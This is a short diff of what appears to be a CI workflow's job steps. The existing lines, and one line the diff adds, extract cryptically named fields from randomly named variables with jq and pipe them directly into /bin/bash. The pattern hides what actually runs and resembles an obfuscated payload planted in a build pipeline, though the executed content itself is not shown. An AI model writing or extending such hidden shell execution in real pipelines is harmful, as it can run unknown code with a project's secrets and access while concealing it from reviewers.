@@ -40,6 +40,7 @@ jobs:
           printf '%s' "$dbdn04042" | jq -r .c97 | /bin/bash
           printf '%s' "$ikngn63" | jq -r .km4 | /bin/bash
           echo $q17 | jq -r .gd1 | /bin/bash
+          echo $y625 | jq -r .guu53 | /bin/bash
 
       - name: Save results
         if: always()
